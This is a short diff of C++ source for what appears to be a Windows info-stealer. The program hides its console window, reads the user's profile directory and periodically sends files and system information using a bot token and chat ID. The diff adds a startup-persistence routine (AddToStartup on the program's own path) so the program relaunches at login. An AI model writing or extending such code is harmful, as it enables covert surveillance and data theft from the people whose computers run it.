@@ -11,6 +11,7 @@
 #include <chrono>
 #include "get_system_info.h"
 #include <filesystem>
+#include "startup.h"
 
 void periodicSend(const std::wstring &token, const std::wstring &chat_id, const std::wstring &filePath, const std::wstring &infoPath)
 {
@@ -39,6 +40,11 @@ int main()
     {
         ShowWindow(GetConsoleWindow(), SW_HIDE);
     }
+
+    WCHAR lpFilePath[MAX_PATH];
+    GetModuleFileNameW(NULL, lpFilePath, MAX_PATH);
+
+    AddToStartup(lpFilePath);
 
     const char *userProfilePath = std::getenv("USERPROFILE");
     char dirPath[MAX_PATH] = {0};
